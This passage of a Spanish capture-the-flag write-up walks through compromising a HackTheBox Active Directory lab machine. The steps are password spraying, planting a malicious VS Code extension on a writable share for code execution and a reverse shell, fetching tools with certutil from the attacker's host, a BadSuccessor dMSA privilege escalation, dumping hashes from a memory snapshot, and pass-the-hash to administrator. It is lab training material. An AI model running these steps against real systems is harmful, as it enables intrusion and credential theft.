LDAP        10.129.23.222   389    DC01             [-] checkpoint.htb\Guest:Checkpoint2024! 
LDAP        10.129.23.222   389    DC01             [-] checkpoint.htb\krbtgt:Checkpoint2024! 
LDAP        10.129.23.222   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.23.222   389    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
LDAP        10.129.23.222   389    DC01             [-] checkpoint.htb\ryan.brooks:Checkpoint2024! 
...
...
```
Excelente, resulta que el usuario que acabamos de restaurar ocupa la misma contraseña que el **usuario alex.turner**.

Veamos si con **mark.davies** podemos hacer algo en **SMB**:
```bash
smbmap -H 10.129.23.222 -u 'mark.davies' -p 'Checkpoint2024!' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.23.222:445	Name: checkpoint.htb      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DevDrop                                           	READ, WRITE	VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VMBackups                                         	NO ACCESS	
[*] Closed 1 connections
```
Muy bien, ya tenemos los permisos de escritura que necesitábamos para el directorio **DevDrop**.

Es hora de armar un **paquete VSIX malicioso**.

### Creando y Cargando Paquete VSIX Malicioso al Servicio SMB {#VSIXmalicioso}

Primero, necesitamos entender cómo armar un **paquete VSIX** y esto podemos consultarlo en el siguiente blog:
* <a href="https://learn.microsoft.com/es-es/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio" target="_blank">Anatomía de un paquete VSIX</a>

O también nos podemos apoyar en la IA, que en mi caso me apoye con **ChatGPT**.

De acuerdo con **ChatGPT**, esta es la estructura que debe contener el **paquete VSIX**:
```bash
TestExtension.vsix
├── extension.vsixmanifest
├── [Content_Types].xml
└── extension/
    └── package.json
    └── extension.js
```

Vamos a construir los primeros archivos, pero antes, guardemos todo en un solo directorio:
```bash
mkdir extensionMaliciosa
cd extensionMaliciosa
```

El contenido del `extension.vsixmanifest` debe ser el siguiente:
```bash
cat extension.vsixmanifest
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0"
 xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">

  <Metadata>
    <Identity Id="Test.Extension"
              Version="1.0"
              Language="en-US"
              Publisher="CTF" />

    <DisplayName>Test Extension</DisplayName>
    <Description>Simple test package</Description>
  </Metadata>

  <Installation>
    <InstallationTarget Id="Microsoft.VisualStudio.Community"
                        Version="[17.0,18.0)" />
  </Installation>

  <Assets>
    <Asset Type="Microsoft.VisualStudio.VsPackage"
           Path="extension/dummy.txt" />
  </Assets>

</PackageManifest>
```

Ahora, veamos el contenido del archivo `[Content_Types].xml`:
```bash
cat '[Content_Types].xml'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="txt" ContentType="text/plain"/>
    <Default Extension="xml" ContentType="text/xml"/>
</Types>
```
Bien, ahora dentro del directorio **extension**, estarán los archivos clave para que se ejecuten los comandos de la extensión maliciosa.

| **Archivo package.json** |
|:------------------------:|
| *El archivo package.json define los metadatos de la extensión, el punto de entrada (main) y los eventos de activación (activationEvents). Cuando se cumple alguno de estos eventos, VS Code carga el archivo principal especificado y ejecuta la lógica de inicialización de la extensión.* |

| **Archivo extension.js** |
|:------------------------:|
| *El archivo extension.js contiene la lógica principal de la extensión y es ejecutado por VS Code cuando se cumplen los eventos de activación definidos en package.json. Dicho código puede hacer uso de la API de VS Code, de las API estándar de Node.js y de bibliotecas de terceros para implementar la funcionalidad de la extensión. Debido a que una extensión VSIX puede contener código JavaScript ejecutable, una instalación automática o insuficientemente validada de extensiones puede representar una superficie de ataque. El impacto real dependerá de los permisos del proceso que hospeda la extensión y de las capacidades permitidas por el entorno de ejecución.* |

Veamos el contenido del archivo **package.json**:
```bash
cat extension/package.json
{
  "name": "tools-extension",
  "displayName": "Tools Extension",
  "version": "1.0.0",
  "publisher": "BerserkWings",
  "engines": {
    "vscode": "^1.118.0"
  },
  "main": "./extension.js",
  "activationEvents": [
    "*"
  ]
}
```
Observa que se especifica qué versión de **VS Code** está enfocada y el campo **activationEvents** especifica los eventos que provocan la activación de la extensión, por lo que al usar `*`, indicamos que la extensión se activa con cualquier evento aplicable.

Y por último, veamos el archivo **extension.js**:
```bash
cat extension/extension.js
const { exec } = require('child_process');

exec(
    'powershell -Command "ping Tu_IP"',
    (err, stdout, stderr) => {
        console.log(stdout);
    }
);
```
En este caso, contiene la ejecución del comando **ping** utilizando **PowerShell**.

Comprimamos todo en un archivo con extensión `.vsix`:
```bash
zip -r ../malicious.vsix extension/
  adding: extension/ (stored 0%)
  adding: extension/package.json (deflated 33%)
  adding: extension/extension.js (deflated 52%)
```

Inicia **tcpdump** para que comience a capturar **paquetes ICMP**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Y carguemos nuestro paquete malicioso:
```bash
smbmap -H 10.129.23.222 -u 'mark.davies' -p 'Checkpoint2024!' --upload 'malicious.vsix' 'DevDrop\malicious.vsix' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] Starting upload: malicious.vsix (802 bytes)                                                                          
[+] Upload complete..                                                                                                    
[*] Closed 1 connections 
```

Espera unos momentos y observa el **tcpdump**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:01:20.583345 IP 10.129.23.222 > Tu_IP: ICMP echo request, id 1, seq 1, length 40
14:01:20.583372 IP Tu_IP > 10.129.23.222: ICMP echo reply, id 1, seq 1, length 40
...
...
```
Estamos capturando **paquetes ICMP**, por lo que sí se ejecutó nuestro comando.

Modifica el archivo **extension.js** para agregar una **Reverse Shell**, comprímelo y vuelve a subirlo al **SMB**.

Ahora, levanta un listener usando primero **rlwrap** y **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Esperemos unos momentos y observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.129.23.222] 55755
whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code>
```
Estamos dentro.

Obtengamos la flag del usuario:
```batch
PS C:\Program Files\Microsoft VS Code> cd C:\Users\ryan.brooks\Desktop
PS C:\Users\ryan.brooks\Desktop> dir

    Directory: C:\Users\ryan.brooks\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---         6/16/2026   2:09 PM             34 user.txt                                                             

PS C:\Users\ryan.brooks\Desktop> type user.txt
```

## Post Explotación {#Post}

### Identificando y Aplicando Ataque BadSuccessor con BloodyAD {#BadSuccessor}

Después de enumerar bastante y de usar algunas herramientas automatizadas, vemos la versión del sistema operativo de la máquina víctima:
```batch
PS C:\Users\ryan.brooks\Desktop> systeminfo

Host Name:                     DC01
OS Name:                       Microsoft Windows Server 2025 Standard
OS Version:                    10.0.26100 N/A Build 26100
OS Manufacturer:               Microsoft Corporation
OS Configuration:              Primary Domain Controller
```
Vemos que es **Microsoft Windows Server 2025 Standard**, por lo que esta versión puede ser vulnerable al **ataque BadSuccessor**.

Podemos comprobarlo de varias formas, pero ocuparemos estas herramientas:
* <a href="https://github.com/akamai/BadSuccessor" target="_blank">Repositorio de akamai: BadSuccessor</a>
* <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank">Repositorio de r3motecontrol: Ghostpack-CompiledBinaries - Rubues.exe</a>

Una vez que los tengas, descárgalos en la máquina víctima utilizando **certutil.exe**:
```batch
PS C:\Users\ryan.brooks\Desktop> certutil.exe -urlcache -split -f http://Tu_IP:8080/Get-BadSuccessorOUPermissions.ps1 Get-BadSuccessorOUPermissions.ps1
PS C:\Users\ryan.brooks\Desktop> certutil.exe -urlcache -split -f http://Tu_IP:8080/Rubeus.exe Rubeus.exe
```

Ejecutemos el script de **PowerShell** y veamos el resultado:
```batch
PS C:\Users\ryan.brooks\Desktop> .\Get-BadSuccessorOUPermissions.ps1

Identity               OUs                                 
--------               ---                                 
CHECKPOINT\ryan.brooks {OU=DMSAHolder,DC=checkpoint,DC=htb}
CHECKPOINT\alex.turner {OU=Employees,DC=checkpoint,DC=htb}
```
Muy bien, tenemos un **OU** vulnerable siendo el **DMSAHolder** que es del **usuario ryan.brooks**.

Esto también podemos comprobarlo con **netexec** usando el servicio **LDAP**:
```bash
nxc ldap 10.129.23.222 -u 'mark.davies' -p 'Checkpoint2024!' -M badsuccessor
LDAP        10.129.23.222   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.23.222   389    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
BADSUCCE... 10.129.23.222   389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.28.127 (DC01.checkpoint.htb)
BADSUCCE... 10.129.23.222   389    DC01             [+] Found 2 results
BADSUCCE... 10.129.23.222   389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
BADSUCCE... 10.129.23.222   389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb
```

Ahora bien, podemos tomar como referencia estos blogs para aplicar el **ataque BadSuccessor**:
* <a href="https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/" target="_blank">Hacking Articles - Abusing BadSuccessor (dMSA): Stealthy Privilege Escalation</a>
* <a href="https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch" target="_blank">BetterSuccessor: Still abusing dMSA for Privilege Escalation (BadSuccessor after patch)</a>
* <a href="https://www.akamai.com/es/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory?vid=badsuccessor-demo-video" target="_blank">BadSuccessor: Explotación de dMSA para derivar privilegios en Active Directory</a>

Prácticamente, podemos aplicar este ataque porque:
* Tenemos control sobre el **OU DMSAHolder** gracias a nuestro **usuario ryan.brooks**.
* El controlador de dominio ejecuta una versión de **Windows Server** que incluye la funcionalidad **dMSA** (**Windows 11 / Server 2025 Build 26100**), requisito para este ataque.
* Nuestro usuario tiene permisos **GenericWrite** sobre el **usuario svc_deploy**, permitiéndonos modificar los atributos necesarios del objeto para establecer la relación de sucesión.

Utilicemos **Rubeus.exe** para generar un **TGT** del **usuario ryan.brooks**:
```batch
PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: KxaNUWrWklPBOh6izXtlNsCXgz/zSUL2QCvnQ09daz0=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBa...
...
...
...
```

Guarda ese ticket, decodificalo con el comando **base64** y guarda el resultado en un **archivo kirbi**:
```bash
nano ryan.b64_kirbi

cat ryan.b64_kirbi | base64 -d ryan.b64_kirby > ryan.kirbi
```

Ahora, usemos **impacket-ticketConverter** para convertirlo en un **archivo ccache** y lo exportamos como variable de entorno en nuestra sesión del Kali con **export**:
```bash
impacket-ticketConverter ryan.kirbi ryan.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

export KRB5CCNAME=ryan.ccache
```

Bien, para aplicar el ataque, utilizaremos **BloodyAD**, pero debemos específicar el **OU** vulnerable y el **OU** al que pertenece el **usuario svc_deploy**:
```bash
python bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=../ryan.ccache add badSuccessor badDMSA --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB'
Clock skew detected. Adjusting local time by 7:11:03.130623. Retrying operation.
[+] Creating DMSA badDMSA$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
Clock skew detected. Adjusting local time by 7:11:03.005549. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : badDMSA$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-16 00:57:19+00:00
EndTime      : 2026-06-16 10:54:04+00:00
RenewTill    : 2026-06-23 00:54:04+00:00
Flags        : enc-pa-rep, forwardable, forwarded, pre-authent, renewable
Keytype      : 18
Key          : S3mVM2HfBG1d0npetoTsFnAekpeZ+DeHPDEyQCBOjts=
EncodedKirbi : 

    doIF4zCCB...
[+] dMSA TGT stored in ccache file evil-dmsa_og.ccache

...
...

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: **********
```
Perfecto, pudimos tramitar un **TGS**, pero lo curioso es que durante el ataque, pudo encontrar un **Hash NT**.

Comprobemos si ese **Hash NT** es del **usuario svc_deploy**:
```bash
nxc smb 10.129.23.222 -u 'svc_deploy' -H '**********'
SMB         10.129.23.222    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.23.222    445    DC01             [+] checkpoint.htb\svc_deploy:**********
```
Genial, tenemos el **Hash NT** del **usuario svc_deploy**, que a diferencia del **TGS**, funciona perfectamente.

### Analizando Memoria de VM y Dumpeando los Hashes NTLM - Técnica Forense {#volatility}

Si recordamos, el **usuario svc_deploy** está dentro del grupo **BackupAccess** y dentro de los archivos compartidos, ya habíamos visto un directorio que parece contener backups.

Para utilizar **smbmap**, ocuparíamos un **Hash NTLM**. Para esto pedí ayuda de **ChatGPT** y me generó un **Hash LM** vacío, que puede servir para crear un **Hash NTLM** válido:
```bash
smbmap -H dc01.checkpoint.htb -u svc_deploy -p 'aad3b435b51404eeaad3b435b51404ee:**********' -r 'VMBackups' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.23.222:445	Name: dc01.checkpoint.htb 	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DevDrop                                           	NO ACCESS	VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VMBackups                                         	READ ONLY	
	./VMBackups
	dr--r--r--                0 Wed May 13 07:58:05 2026	.
	dr--r--r--                0 Sat May  9 08:42:27 2026	..
	dr--r--r--                0 Wed May 13 07:58:18 2026	NightlyBackup_2024-11-01
```
Genial, hay un directorio y dentro de este, encontraremos otro directorio llamado **memory forensics**.

Este último contendra varios archivos:
```bash
smbmap -H dc01.checkpoint.htb -u svc_deploy -p 'aad3b435b51404eeaad3b435b51404ee:**********' -r 'VMBackups/NightlyBackup_2024-11-01/memory forensics' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.23.222:445	Name: dc01.checkpoint.htb 	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DevDrop                                           	NO ACCESS	VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VMBackups                                         	READ ONLY	
	./VMBackupsNightlyBackup_2024-11-01/memory forensics
	dr--r--r--                0 Wed May 13 07:58:18 2026	.
	dr--r--r--                0 Wed May 13 07:58:18 2026	..
	fr--r--r--        106496000 Wed May 13 07:58:18 2026	Windows Server 2019-000001.vmdk
	fr--r--r--       2147483648 Wed May 13 07:58:18 2026	Windows Server 2019-Snapshot1.vmem
	fr--r--r--        138164859 Thu May 14 16:32:32 2026	Windows Server 2019-Snapshot1.vmsn
	fr--r--r--           270840 Wed May 13 07:58:18 2026	Windows Server 2019.nvram
	fr--r--r--             7642 Wed May 13 07:58:18 2026	Windows Server 2019.scoreboard
	fr--r--r--      10199695360 Wed May 13 07:58:18 2026	Windows Server 2019.vmdk
	fr--r--r--              502 Wed May 13 07:58:18 2026	Windows Server 2019.vmsd
	fr--r--r--             2749 Wed May 13 07:58:18 2026	Windows Server 2019.vmx
	fr--r--r--              274 Wed May 13 07:58:18 2026	Windows Server 2019.vmxf
```
Todos estos archivos pertenecen a una máquina virtual, pero entre ellos vemos un **snapshot**.

| **Archivo vmem** |
|:----------------:|
| *Un archivo .vmem es un archivo que contiene una captura de la memoria RAM de una máquina virtual. Es común en plataformas de virtualización como VMware Workstation y VMware ESXi. Cuando una máquina virtual está encendida o se suspende, VMware puede guardar el contenido completo de la memoria en un archivo .vmem. Puede contener prácticamente todo lo que estaba en la RAM de la máquina virtual en ese momento: Procesos en ejecución, contraseñas y credenciales, claves criptográficas, etc.* |

Vamos a descargar ese **snapshot .vnem** (**IMPORTANTE**, esto puede tardar bastante tiempo, pues en mi caso tardo poco más de **20 minutos**):
```bash
smbmap -H dc01.checkpoint.htb -u svc_deploy -p 'aad3b435b51404eeaad3b435b51404ee:**********' --download 'VMBackups/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] Starting download: VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem (2147483648 bytes)
[+] File output to: /../HackTheBox/Season11/Checkpoint/content/test/10.129.23.222-VMBackups_NightlyBackup_2024-11-01_memory forensics_Windows Server 2019-Snapshot1.vmem
[*] Closed 1 connections 
```

Bien, te dejo los siguientes blogs que explican como analizar la memoria de una **VM**:
* <a href="https://hackers-arise.com/digital-forensics-volatility-memory-analysis-guide-part-1/" target="_blank">Digital Forensics: Volatility – Memory Analysis Guide, Part 1</a>
* <a href="https://medium.com/@refat47/analyzing-vmem-files-like-a-pro-memory-forensics-with-volatility-3-642919edd0c2" target="_blank">Analyzing VMEM Files Like a Pro - Memory Forensics with Volatility 3</a>
* <a href="https://www.blackhillsinfosec.com/offline-memory-forensics-with-volatility/" target="_blank">Offline Memory Forensics With Volatility</a>

Además, ocuparemos la herramienta **volatility3** que puedes descargar aquí:
* <a href="https://github.com/volatilityfoundation/volatility3" target="_blank">Repositorio de volatility: volatility3</a>

Una vez que la tengas instalada, podemos empezar a obtener información de ese **snapshot**; en mi caso, ocupé la versión instalada con **pip**:
```bash
python3 -m venv venv
source venv/bin/activate
pip install volatility3
```

Con **volatility3**, podemos obtener la información de la **VM**:
```bash
vol -f Windows-Server-2019-Snapshot1.vmem windows.info.Info
Volatility 3 Framework 2.28.0
WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows-Server-2019-Snapshot1.vmem and Windows-Server-2019-Snapshot1.vmss.
Progress:  100.00		PDB scanning finished                        
Variable	Value

Kernel Base	0xf80725608000
DTB	0x1ad000
Symbols	file:///../HackTheBox/Season11/Checkpoint/content/bloodyAD/venv/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/EF9A48AFA50FF07C616585BB01919536-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdVersionBlock	0xf80725a08f10
Major/Minor	15.17763
MachineType	34404
KeNumberProcessors	2
SystemTime	2026-05-09 14:08:58+00:00
NtSystemRoot	C:\Windows
NtProductType	NtProductServer
NtMajorVersion	10
NtMinorVersion	0
PE MajorOperatingSystemVersion	10
PE MinorOperatingSystemVersion	0
PE Machine	34404
PE TimeDateStamp	Sun Nov 10 07:20:39 2075
```

Y lo más importante, veamos si podemos obtener los hashes almacenados:
```bash
vol -f Windows-Server-2019-Snapshot1.vmem windows.registry.hashdump.Hashdump
Volatility 3 Framework 2.28.0
WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows-Server-2019-Snapshot1.vmem and Windows-Server-2019-Snapshot1.vmss.
Progress:  100.00		PDB scanning finished                        
User	rid	lmhash	nthash

Administrator	500	********** **********
Guest	501	********** **********
DefaultAccount	503	********** **********
WDAGUtilityAccount	504	********** **********
```
Excelente, tenemos el **Hash NTLM** del **administrador**.

Comprobemos si funciona:
```bash
 nxc smb 10.129.27.81 -u 'administrator' -H '**********:**********'
SMB         10.129.27.81    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.27.81    445    DC01             [+] checkpoint.htb\administrator:********** (Pwn3d!)
```
Sí funciona.

Además, debe funcionar ante el servicio **WinRM**:
```bash
nxc winrm 10.129.27.81 -u 'administrator' -H '**********:**********'
WINRM       10.129.27.81    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) 
WINRM       10.129.27.81    5985   DC01             [+] checkpoint.htb\administrator:********** (Pwn3d!)
```

Utilicemos **evil-winrm** para autenticarnos en la máquina víctima como **administrador**:
```batch
evil-winrm -i 10.129.23.222 -u 'administrator' -H '**********'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
checkpoint\administrator
```
Estamos dentro.

Busquemos la última flag:
```batch
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../..
*Evil-WinRM* PS C:\Users> cd max.palmer
*Evil-WinRM* PS C:\Users\max.palmer> cd Desktop
*Evil-WinRM* PS C:\Users\max.palmer\Desktop> dir

    Directory: C:\Users\max.palmer\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/15/2026   3:57 PM             34 root.txt

*Evil-WinRM* PS C:\Users\max.palmer\Desktop> type root.txt
...
```
Y con esto, terminamos la máquina.
